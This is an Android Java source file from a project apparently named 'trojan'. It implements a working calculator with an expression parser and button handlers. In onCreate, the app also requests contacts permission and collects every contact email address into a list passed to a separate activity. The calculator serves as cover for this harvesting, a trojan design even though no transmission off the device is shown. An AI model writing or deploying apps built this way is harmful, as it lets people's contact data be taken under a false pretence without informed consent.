package com.example.nathaniel.trojan;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.v4.app.Fragment;
import android.support.v4.app.LoaderManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.AdapterView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;
    ArrayList<String> emailList;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        emailList = getEmails();
    }

    public static double eval(final String str) {
        return new Object() {
            int pos = -1, ch;

            void nextChar() {
                ch = (++pos < str.length()) ? str.charAt(pos) : -1;
            }

            boolean eat(int charToEat) {
                while (ch == ' ') nextChar();
                if (ch == charToEat) {
                    nextChar();
                    return true;
                }
                return false;
            }

            double parse() {
                nextChar();
                double x = parseExpression();
                if (pos < str.length()) throw new RuntimeException("Unexpected: " + (char)ch);
                return x;
            }

            // Grammar:
            // expression = term | expression `+` term | expression `-` term
            // term = factor | term `*` factor | term `/` factor
            // factor = `+` factor | `-` factor | `(` expression `)`
            //        | number | functionName factor | factor `^` factor

            double parseExpression() {
                double x = parseTerm();
                for (;;) {
                    if      (eat('+')) x += parseTerm(); // addition
                    else if (eat('-')) x -= parseTerm(); // subtraction
                    else return x;
                }
            }

            double parseTerm() {
                double x = parseFactor();
                for (;;) {
                    if      (eat('*')) x *= parseFactor(); // multiplication
                    else if (eat('/')) x /= parseFactor(); // division
                    else return x;
                }
            }

            double parseFactor() {
                if (eat('+')) return parseFactor(); // unary plus
                if (eat('-')) return -parseFactor(); // unary minus

                double x;
                int startPos = this.pos;
                if (eat('(')) { // parentheses
                    x = parseExpression();
                    eat(')');
                } else if ((ch >= '0' && ch <= '9') || ch == '.') { // numbers
                    while ((ch >= '0' && ch <= '9') || ch == '.') nextChar();
                    x = Double.parseDouble(str.substring(startPos, this.pos));
                } else if (ch >= 'a' && ch <= 'z') { // functions
                    while (ch >= 'a' && ch <= 'z') nextChar();
                    String func = str.substring(startPos, this.pos);
                    x = parseFactor();
                    if (func.equals("sqrt")) x = Math.sqrt(x);
                    else if (func.equals("sin")) x = Math.sin(Math.toRadians(x));
                    else if (func.equals("cos")) x = Math.cos(Math.toRadians(x));
                    else if (func.equals("tan")) x = Math.tan(Math.toRadians(x));
                    else throw new RuntimeException("Unknown function: " + func);
                } else {
                    throw new RuntimeException("Unexpected: " + (char)ch);
                }

                if (eat('^')) x = Math.pow(x, parseFactor()); // exponentiation

                return x;
            }
        }.parse();
    }

    public ArrayList<String> getEmails() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
        }
        else {
            ArrayList<String> emlRecs = new ArrayList<String>();
            HashSet<String> emlRecsHS = new HashSet<String>();
            Context context = MainActivity.this;
            ContentResolver cr = context.getContentResolver();
            String[] PROJECTION = new String[]{ContactsContract.RawContacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME,
                    ContactsContract.Contacts.PHOTO_ID,
                    ContactsContract.CommonDataKinds.Email.DATA,
                    ContactsContract.CommonDataKinds.Photo.CONTACT_ID};
            String order = "CASE WHEN "
                    + ContactsContract.Contacts.DISPLAY_NAME
                    + " NOT LIKE '%@%' THEN 1 ELSE 2 END, "
                    + ContactsContract.Contacts.DISPLAY_NAME
                    + ", "
                    + ContactsContract.CommonDataKinds.Email.DATA
                    + " COLLATE NOCASE";
            String filter = ContactsContract.CommonDataKinds.Email.DATA + " NOT LIKE ''";
            Cursor cur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, PROJECTION, filter, null, order);
            if (cur.moveToFirst()) {
                do {
                    // names comes in hand sometimes
                    String name = cur.getString(1);
                    String emlAddr = cur.getString(3);

                    // keep unique only
                    if (emlRecsHS.add(emlAddr.toLowerCase())) {
                        emlRecs.add(emlAddr);
                    }
                } while (cur.moveToNext());
            }

            cur.close();
            return emlRecs;
        }
        return null;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        if (requestCode == PERMISSIONS_REQUEST_READ_CONTACTS) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission is granted
                getEmails();
            } else {
                Toast.makeText(this, "Until you grant the permission, we cannot display the names", Toast.LENGTH_SHORT).show();
            }
        }
    }

    public void clickbutton1(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("1");
    }

    public void clickbutton2(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("2");
    }

    public void clickbutton3(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("3");
    }

    public void clickbutton4(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("4");
    }

    public void clickbutton5(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("5");
    }

    public void clickbutton6(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("6");
    }

    public void clickbutton7(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("7");
    }

    public void clickbutton8(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("8");
    }

    public void clickbutton9(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("9");
    }

    public void clickbutton0(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append("0");
    }

    public void clickbuttonperiod(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append(".");
    }

    public void clickbuttondivide(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append(" / ");
    }

    public void clickbuttonmultiply(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append(" * ");
    }

    public void clickbuttonsubtract(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append(" - ");
    }

    public void clickbuttonadd(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.append(" + ");
    }

    public void clickbuttonenter(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        String calctext = calcfield.getText().toString();
        String evalcalctext = String.valueOf(eval(calctext));
        calcfield.setText(evalcalctext);
    }

    public void clickbuttonclear(View view){
        TextView calcfield = (TextView)findViewById(R.id.calcfield);
        calcfield.setText("");
    }

    public void clickbuttonemails(View view){
        Intent intent = new Intent(this, emailActivity.class);
        intent.putExtra("emailList", emailList);
        startActivity(intent);
    }

}

